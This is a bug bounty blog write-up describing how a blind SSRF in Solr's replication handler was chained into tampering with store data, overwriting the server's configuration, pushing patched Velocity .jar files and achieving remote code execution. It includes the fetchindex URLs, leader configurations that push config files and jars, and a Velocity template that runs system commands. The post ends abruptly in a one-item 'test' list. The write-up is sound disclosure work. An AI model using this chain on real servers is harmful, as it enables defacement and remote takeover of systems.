{% raw %}Hello there! In this post, I will be discussing one of the most beautiful and complex vulnerabilities I have ever found, and how it got triaged as "Duplicate" although I was the only one achieving RCE. I discovered it some weeks ago in the same bug bounty program as the one described in <a href="/posts/unrestricted-access-and-arbitrary-file-read-in-solr-endpoint">my previous post</a>. As back then, since this is a private program, I will need to hide many stuff. However, I can tell you that it belongs to one of the biggest videogames companies, which doesn't have a very good relationship with hackers and other tinkerers ;).

Also, just to mention it, I have omitted some obscure Solr details that are not that interesting and many rabbit holes in which I fell during this research. This is a very long and technical post, but I hope you appreciate it and find it as interesting as me!


[[ Previous work ]]

This story begins last year, when I found three vulnerabilities in different Solr servers from a single private program. As already mentioned, some of these vulnerabilities are described in <a href="/posts/unrestricted-access-and-arbitrary-file-read-in-solr-endpoint">another post from this blog</a>. I really recommend reading it first, since it serves as an introduction to some Solr concepts that will be discussed here.

<img src="/assets/images/posts/2025-02-21/previous-vulns.png"style="width: 45em">

One of these Solr servers contained frontend data for all european stores of the company, such as product names, descriptions, prices, image URLs, sales, etc. It was open and could be queried freely, so it didn't contain any private data. Among other bugs, I found that it was vulnerable to a blind SSRF, which was a known vulnerability identified as <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-27905">CVE-2021-27905</a>. However, since it was not a high or critical severity bug, I didn't report it and decided to keep it to myself in case I could use it in the future as part of a more complex exploit chain. In the end, I just left this behind and moved into some other unrelated project.

Some months later (two weeks ago at the time of writing this post), I decided that I would like to spend more time doing bug bounties. I thought that it could be a good starting point to check all my previous notes for the vulnerabilities that I had reported in the past, in case something had changed. The goal was to get into the mood and to try preparing my mind to start hacking consistently, as I have found during my career that the mental aspect is the most difficult part for me when doing bug bounties.

Now, with a more positive perspective in mind, when I remembered that I had a blind SSRF in a program in which I had already found two high and one critical bugs, I knew that I had to take another look. However, this time I was going to take a more research-like approach and was decided to dig much deeper into Solr. I quickly verified that the blind SSRF was still exploitable and got right into it.


[[ Understanding the blind SSRF ]]

My first objective was to fully understand the blind SSRF vulnerability, since I originally found it by looking for common Solr vulnerabilities and didn't go any deeper. As already mentioned it's knwon as <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-27905">CVE-2021-27905</a>, and is located in the replication request handler of the Solr server, which in this case was at "/solr/&lt;core&gt;/replication". It could be triggered by visiting the following URL, where "de" is the name of one of the available Solr cores in the target server:

<code>https://target.com/solr/de/replication?command=fetchindex&leaderUrl=attacker.com</code>

In order to learn more about all the functionalities involved in this bug, I needed to look at the Solr docs. Luckily, Apache maintains a huge web portal to host the Solr documentation, so it was not difficult to find the <a href="https://solr.apache.org/guide/solr/latest/deployment-guide/user-managed-index-replication.html">chapter related to Index Replication</a>. As I learnt, replication allows creating an infrastructure of several Solr instances in which a leader instance distributes copies of its data to the follower instances. The leader then manages updates to the data while the followers manage the querying.

<img src="/assets/images/posts/2025-02-21/replication.png" style="width: 15em">

Each of the instances that participate in this infrastructure has an available request handler ("/replication"), which accepts a series of commands depending if its a leader or a follower. These commands are detailed in <a href="https://solr.apache.org/guide/solr/latest/deployment-guide/user-managed-index-replication.html#http-api-commands-for-the-replicationhandler">one of the sections of the Index Replication chapter</a>, in which "fetchindex" is described as follows:

<code>fetchindex

  Force the specified follower to fetch a copy of the index from its leader.

    http://_follower_host:port_/solr/_core_name_/replication?command=fetchindex

  You can pass an extra attribute such as leaderUrl or compression (or any other parameter described in Configuring a Follower Server) to do a one time replication from a leader. This removes the need for hard-coding the leader URL in the follower configuration.
</code>

This meant that the Solr server in which I found the blind SSRF was a follower instance, for which a leader could be specified to perform a one time replication from it by using the "fetchindex" command. When I learnt about this, the first thing I thought was that maybe I could be able to create a malicious Solr server that acted as a leader and distribute a copy of my own data into the target server. Since the target Solr server contained the data for all Europe stores of the company, this would mean that I would be able to modify the contents of these stores! This sounded great, but there was a long road ahead.

Looking around, I also learnt about other replication commands, such as "details" which can be used to retrieve the replication configuration. In this case, it could be executed at the following URL:

<code>https://target.com/solr/de/replication?command=details</code>

The server sent back a huge JSON response that I didn't fully understand at the moment (also, I couldn't find any copy of this original response when writing this post, since they have now restricted access to this endpoint and I didn't take enough screenshots lol). However, among other things, I learnt from this output that this server also allowed others to replicate data from it, meaning that I could probably download the entire dataset.

This would be very useful, since, theoretically, I could just replicate the dataset, introduce a test entry and then distribute it back to the target server. This way, the service wouldn't be interrupted in any way, but I could easily prove that I was able to modify the dataset by querying for the newly added entry.

Great, the goal now was first to deploy a malicious Solr instance and check if I could replicate the database from the target server.


[[ Creating my own Solr instance ]]

So, I downloaded the latest binary release from the <a href="https://solr.apache.org/downloads.html">Solr website</a> and followed their <a href="https://solr.apache.org/guide/solr/latest/deployment-guide/installing-solr.html">deployment guide</a>. This binary release includes a command line interface tool that allows starting/stopping Solr, managing cores, basic configuration, etc. This way, Solr can be started on port 9000 with the following command:

<code>$ bin/solr start -p 9000</code>

Once the "start" command has completed, the admin interface can be accessed at "http://127.0.0.1:9000/":

<img src="/assets/images/posts/2025-02-21/solr_admin.png" style="width: 50em">

The next step was to create a core, which is just a fancy name for a dataset. The following command creates a new empty core named "hacefresk0":

<code>$ bin/solr create -c hacefresk0</code>

It can then be queried at the select request handler:

<img src="/assets/images/posts/2025-02-21/select.png" style="width: 55em">

Then, I needed to configure the replication request handler for the core to be a follower of the target server "https://target.com/solr/de/". To do so, I needed to edit the core configuration file located at "server/solr/hacefresk0/conf/solrconfig.xml" and add the following entry:

<code class="language-xml">&#60;requestHandler name="/replication" class="solr.ReplicationHandler"&#62;
    &#60;lst name="slave"&#62;
        &#60;str name="leaderUrl"&#62;https://target.com/solr/de/&#60;/str&#62;
        &#60;str name="pollInterval"&#62;00:00:20&#60;/str&#62;
    &#60;/lst&#62;
&#60;/requestHandler&#62;</code>

After restarting the server, I should be able to replicate the dataset using the "fetchindex" in the replication endpoint. However, the server responded with the following error:

<img src="/assets/images/posts/2025-02-21/whitelist_error.png" style="width: 55em">

Some googling around later, I found that, currently, Solr requires the specified "leaderUrl" to be explicitly whitelisted or to use the flag "-Dsolr.disable.allowUrls=true" on start up. This means that either the target server is using an old Solr version that doesn't implement this protection or that they are explicitly using this flag. Anyways, I restarted the server using this flag:

<code>$ bin/solr stop; bin/solr start -p 9000 -Dsolr.disable.allowUrls=true</code>

I executed the "fetchindex" command again and was able to successfully replicate the dataset from the target server!

<img src="/assets/images/posts/2025-02-21/successful_replication.png" style="width: 55em">

As I have mentioned before, this behavior alone is not a vulnerability in itself, since this dataset is public and doesn't contain any private information.

Next thing is to add a harmless entry to later prove that I can modify the database. To do so, I first stopped the polling of more data from the target server with the replication command "disablepoll", since a new replication would overwrite local changes. Then, I added an entry with ID "1337" and title "Hacked by hacefresk0" :P

<img src="/assets/images/posts/2025-02-21/edit.png" style="width: 55em">

At this point, I had a replica of the dataset from the target server with a newly added 1337-elite-hacker entry. Now, I needed to check if I could actually distribute this dataset to the target server or if this was all just a rabbit hole.


[[ Replicating to the target server ]]

In order to configure my local server to be a replication leader, I needed to modify the configuration for the replication request handler that I had previously added to the core config file:

<code class="language-xml">&#60;requestHandler name="/replication" class="solr.ReplicationHandler"&#62;
    &#60;lst name="leader"&#62;
        &#60;str name="replicateAfter"&#62;optimize&#60;/str&#62;
        &#60;str name="backupAfter"&#62;optimize&#60;/str&#62;
    &#60;/lst&#62;
&#60;/requestHandler&#62;</code>

Then, I restarted the server for the changes to apply and use <a href="https://ngrok.com/">ngrok</a> to expose the local leader server to the Internet:

<code>$ ngrok http 9000</code>

To check that the replication leader was working correctly, I first wanted to test it locally. I created a new core named "replica" and configured it to be a follower of the leader using the URL given by "ngrok":

<code class="language-xml">&#60;requestHandler name="/replication" class="solr.ReplicationHandler"&#62;
    &#60;lst name="slave"&#62;
        &#60;str name="leaderUrl"&#62;https://&lt;ngrok_url&gt;/solr/hacefresk0/&#60;/str&#62;
        &#60;str name="pollInterval"&#62;00:00:20&#60;/str&#62;
    &#60;/lst&#62;
&#60;/requestHandler&#62;</code>

Then, I executed the "fetchindex" command and successfully replicated the dataset from the local leader! 

<img src="/assets/images/posts/2025-02-21/local-replication.png" style="width: 55em">

Now it was time to execute it on the target server. I accessed the following URL to trigger the replication:

<code>https://target.com/solr/de/replication?command=fetchindex&leaderUrl=https://&lt;ngrok_url&gt;/solr/hacefresk0/</code>

However... no connection was received by ngrok :/ I repeated the process multiple times and reseted everything but I couldn't make it work. I made the same local test again as before and it was successful, but I wasn't able to execute it against the target server, so I left it there and took a break for a couple of days.

Then, while playing some videogames, it clicked. I didn't know the Solr version that the target server was using, and maybe the difference between that and the version of my local server was preventing the replication. I got back to it and started trying to trigger some errors in the target server to see if I could disclose the Solr version andI found it! It was using version 8.11 (I don't remember how I exactly got the error since I just noted down the version, but it was probably something in the replication request handler). I immediately downloaded the binary release for Solr 8.11 from <a href="https://solr.apache.org/downloads.html">their website</a> and started recreating the same test environment.

When everything was ready, I triggered the replication in the target server using the "fetchindex" command and... it worked! When I queried for my custom 1337 entry, there it was for everyone to see it:

<img src="/assets/images/posts/2025-02-21/replication-success.png" style="width: 55em">

I was able to successfully modify the data for every European store of the company, meaning that I could deface them, introduce malicious links and much more! However, now that I could distribute data into the target Solr server, I wanted to know what else was I capable of.


[[ Modifying the target server configuration ]]

Earlier, while reading the <a href="https://solr.apache.org/guide/solr/latest/deployment-guide/user-managed-index-replication.html#configuring-a-leader-server">Solr docs about creating a replication leader</a>, I glanced at one of the possible parameters for the "leader" element in the replication request handler config:

<code>confFiles

    Optional | Default: none

    The configuration files to replicate to the follower, separated by a comma. These should be files such as the schema, stopwords, and similar configuration files that may change on the leader and need to be updated on the follower to use when serving queries.

    [...]
</code>

Now that I knew for sure that replication was possible, I wanted to investigate this further. Essentially, this parameter allows the leader to specify a set of config files, located in the same directory as "solrconfig.xml", to be replicated into the followers. Once they are received, they get loaded as if the server was restarted. It is also possible to specify the filename that will be used for these config files once they reach the followers.

I wanted to test if I was able to deliver arbitrary config files to the target server using this parameter. So, I created a new file named "hacefresk0-config.xml", which would be renamed as "solrconfig.xml" in the target server, overwriting its own config file. To be able to distribute it, I added the corresponding "confFiles" element to the replication request handler of my local server:

<code class="language-xml">&#60;requestHandler name="/replication" class="solr.ReplicationHandler"&#62;
    &#60;lst name="leader"&#62;
        &#60;str name="replicateAfter"&#62;optimize&#60;/str&#62;
        &#60;str name="backupAfter"&#62;optimize&#60;/str&#62;
        &#60;str name="confFiles"&#62;hacefresk0-config.xml:solrconfig.xml&#60;/str&#62;
    &#60;/lst&#62;
&#60;/requestHandler&#62;</code>

The file "hacefresk0-config.xml" was a copy of the default "solrconfig.xml" for Solr 8.11 with some modifications. Since the leader URL was shown in the server response of the "details" command, I added a custom one to check if the new config would actually be successfully loaded into the server. The leader URL that I used was just the current one, which corresponded to an internal server of the company, but with the "443" port explicitly specified:

<code class="language-xml">&#60;requestHandler name="/replication" class="solr.ReplicationHandler"&#62;
    &#60;lst name="slave"&#62;
        &#60;str name="leaderUrl"&#62;https://leader.target.com:443/solr/de/&#60;/str&#62;
        &#60;str name="pollInterval"&#62;00:00:20&#60;/str&#62;
    &#60;/lst&#62;
&#60;/requestHandler&#62;</code>

Same as before, I restarted my local server and triggered a replication on the target server using the "fetchindex" command. I received several requests on the ngrok interface and, when I executed the "details" command on the target server, it showed that the "hacefresk0-config.xml" had been correctly replicated and the leader URL now contained the ":443", meaning that I had successfully modified the configuration of the target server!

<img src="/assets/images/posts/2025-02-21/config-replicated.png" style="width: 55em">

Next step was trying to use this behavior to achieve RCE.


[[ Finding a gadget to get RCE ]]

At this point, I started looking for known RCEs in Solr and investigating if any of them could be triggered by modifying the core configuration file. Apart from the Solr docs, I read many helpful articles such as <a href="https://github.com/veracode-research/solr-injection/">this one about "Solr injection"</a> and <a href="https://github.com/Imanfeng/Apache-Solr-RCE
">this other one about Solr RCEs only</a>. Also, as in <a href="/posts/unrestricted-access-and-arbitrary-file-read-in-solr-endpoint">my other blog post about Solr</a>, I looked at the <a href="https://github.com/search?q=repo%3Aprojectdiscovery%2Fnuclei-templates%20solr&type=code">nuclei templates repository</a>, which is always a good source for exploits. 

As a result, I found many cases in which it had been possible to enable dangerous functionalities in previous versions via the config file, but then developers had restricted it so that it could only be managed using the Solr binary or environment variables. For example, this was the case with <a href="https://solr.apache.org/guide/solr/latest/indexing-guide/content-streams.html#remote-streaming">remote streaming</a>. Another big restriction was that the target server only allowed access to "/select" and "/replication", meaning that I couldn't use any exploit that ultimately relied on other request handlers.

After many rabbit holes, I ended up using <a href="https://solr.apache.org/guide/8_11/velocity-response-writer.html">Velocity templates</a>, which are very powerful Java-based templates that had been used in the past for exploiting Solr. Here is an example of a simple one:

<code class="language-velocity">&#60;html&#62;
    &#60;body&#62;
        Hello $customer.Name!
        &#60;table&#62;
        #foreach( $mud in $mudsOnSpecial )
            #if ( $customer.hasPurchased($mud) )
                &#60;tr&#62;
                    &#60;td&#62;$flogger.getPromo( $mud )&#60;/td&#62;
                &#60;/tr&#62;
            #end
        #end
        &#60;/table&#62;
    &#60;/body&#62;
&#60;/html&#62;
</code>

In older versions, it was possible to use the configuration request handler at "/config" to enable the Velocity engine and provide a custom template to achieve RCE. When the developers found out, they restricted its management so that it was only available through the "solrconfig.xml" configuration file.

Taking into account that I could modify the config file of the target server, this situation seemed perfect. However, there was a little inconvinience. In current versions, the .jar libraries that were needed to run the Velocity engine were no longer bundled by default with Solr, since it has been deprecated since version 9.0, so they had to be manually added. To do so, they had to be placed in a directory accessible by Solr and referenced in the config file.

This felt like a dead end, but then I had an idea. Maybe, if I was able to deliver arbitrary config files to the target server, I might be able to deliver .jar files too. Since they are loaded using the "solrconfig.xml", which I could modify, I would be able to enable the Velocity engine in the target server. But first, I needed to find those .jar files :D.

As it turned out, they can now be found in <a href="https://github.com/erikhatcher/solr-velocity/tree/main/repo">the github repo</a> for a 3rd party Solr plugin that has currently "replaced" Velocity after its deprecation. I downloaded the .jar files and started setting up my local test environment to check if I could replicate them from a leader to a follower.

I spawned two Solr instances: a leader and a follower. I copied the Velocity .jar files into the same directory in which the leader "solrconfig.xml" was located ("server/solr/leader/conf/") and configured it to distribute them on replication:

<code class="language-html">&#60;requestHandler name="/replication" class="solr.ReplicationHandler"&#62;
    &#60;lst name="leader"&#62;
        &#60;str name="replicateAfter"&#62;optimize&#60;/str&#62;
        &#60;str name="backupAfter"&#62;optimize&#60;/str&#62;
        &#60;str name="confFiles"&#62;solritas-0.9.5.jar,velocity-engine-core-2.1.jar,velocity-tools-generic-3.0.jar&#60;/str&#62;
    &#60;/lst&#62;
&#60;/requestHandler&#62;</code>

For the follower, I configured a simple follower replication request handler pointing to the leader instance:

<code class="language-xml">&#60;requestHandler name="/replication" class="solr.ReplicationHandler"&#62;
    &#60;lst name="slave"&#62;
        &#60;str name="leaderUrl"&#62;http://localhost:9000/solr/leader/&#60;/str&#62;
        &#60;str name="pollInterval"&#62;00:00:20&#60;/str&#62;
    &#60;/lst&#62;
&#60;/requestHandler&#62;</code>

I added some test data to the leader so that it has something to replicate (else, the replication wouldn't take place), and executed the command "fetchindex" on the follower instance. The .jar files were successfully distributed from the leader to the follower!

<img src="/assets/images/posts/2025-02-21/jar-replication.png" style="width: 55em">

Once I knew I could distribute the .jar files, I needed to test if I could actually enable Velocity using them. Since I already knew that I could modify the config file remotely, I edited manually the "solrconfig.xml" of the follower to save time. I added a "&lt;lib&gt;" element to import all .jar files in the "server/solr/follower/conf/" directory and a "&lt;queryResponseWriter&gt;" element to enable Velocity:

<code class="language-xml">&#60;lib dir="conf/" regex=".*\.jar"/&#62;

&#60;queryResponseWriter name="velocity" class="solr.VelocityResponseWriter"&#62;
    &#60;str name="template.base.dir"&#62;&#60;/str&#62;
&#60;/queryResponseWriter&#62;</code>

Then, I restarted the server and accessed "/select?q=1&wt=velocity&v.template=browse&v.layout=layout", which rendered the default Velocity template "browse", meaning that Velocity had been enabled:

<img src="/assets/images/posts/2025-02-21/browse-velocity.png" style="width: 55em">

Great. Up to this point, I was able to enable the Velocity engine by distributing the needed .jar libraries and a custom "solrconfig.xml". The only piece missing was to provide a malicious Velocity template to achieve RCE. In older versions, once Velocity was enabled, this could be done directly by using URL parameters in the select request handler at "/select", similar to rendering the default "browse" template as I did before. However, when I tried this, I learnt that Velocity now only supports executing templates from the local filesystem. Since I was able to deliver arbitrary files, this was not a problem, so I jumped straight into rendering a malicious template in my local server to check if I was able to actually get RCE.

I created a simple template that would execute the command "id" on the server and saved it as "rce.vm" at "server/solr/follower/conf/velocity/rce.vm":

<code class="language-velocity">#set($x='')
#set($rt=$x.class.forName('java.lang.Runtime'))
#set($chr=$x.class.forName('java.lang.Character'))
#set($str=$x.class.forName('java.lang.String'))
#set($ex=$rt.getRuntime().exec('id'))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end</code>

I restarted the server and accessed "/select?q=1&wt=velocity&v.template=rce" to render it... but it didn't execute the "id" command:

<img src="/assets/images/posts/2025-02-21/failed-local-rce.png" style="width: 45em">

After checking too many times if the syntax of the template was correct and searching for hours on the Internet, I "kind of understood" why it was not rendering correctly. It looked like the Velocity engine was configured so that it did not allow instantiation of new classes (something related to an internal class named "SecureUberspector", see <a href="https://issues.apache.org/jira/browse/VELOCITY-931">this issue</a> if you are somehow that interested). This essentially meant that calls to "$x.class.forName()" were not being executed at all. Fuck.

At this point, I ran out of ideas, so I took a break for a few days.


[[ Patching Velocity ]]

One night, while revisiting my notes for this, I thought that maybe I was able to find some answers in the <a href="https://github.com/erikhatcher/solr-velocity/tree/main">Velocity plugin github repo</a>, since it also contained the Java code for the Velocity .jar files. I searched for the string "SecureUberspector" and, to my surprise, there were two results:

<img src="/assets/images/posts/2025-02-21/github-velocity.png" style="width: 45em">

The first result corresponded to the piece of code responsible of disabling the instantiation of new classes at "solr-velocity/src/main/java/org/apache/solr/response/VelocityResponseWriter.java"!

<img src="/assets/images/posts/2025-02-21/secureuberfuck.png" style="width: 45em">

Well, that was thrilling. Maybe I could recompile remove these lines and recompile the .jar files so that the resulting Velocity engine had no restrictions. After some trial and error and fixing a broken dependency in the "pom.xml" file of the project, I was able to recompile the .jar files:

<img src="/assets/images/posts/2025-02-21/maven-success.png" style="width: 45em">

I substituted the previous Velocity libraries for these ones on my local Solr instance, in which Velocity was already configured from the previous tests, and tried again accessing the "rce.vm" template at "/select?q=1&wt=velocity&v.template=rce":

<img src="/assets/images/posts/2025-02-21/local-rce.png" style="width: 45em">

Awesome! I had a working exploit to get RCE on the target server! Now, since I was already recompiling the Velocity plugin and delivering the custom .jar libraries, I thought that it would be cooler to modify the default "browse" template, which comes bundled inside the .jar files, so that I didn't have to send the templates too. So, I created a PoC template that showed that I was able to obtain RCE on the target server by executing the "id" command:

<code class="language-velocity">&#60;title&#62;Hacked by hacefresk0&#60;/title&#62;
&#60;h1&#62;Hacked by hacefresk0&#60;/h1&#62;
&#60;br&#62;
&#60;pre&#62;
#set($x='') #set($rt=$x.class.forName('java.lang.Runtime')) #set($chr=$x.class.forName('java.lang.Character')) #set($str=$x.class.forName('java.lang.String')) #set($ex=$rt.getRuntime().exec('id')) $ex.waitFor() #set($out=$ex.getInputStream()) #foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
&#60;/pre&#62;</code>

I recompiled the .jar libraries again and prepared the exploit. To recap, these were the steps to achieve RCE on the target server:
<ol>
<li>test</li>
</ol>
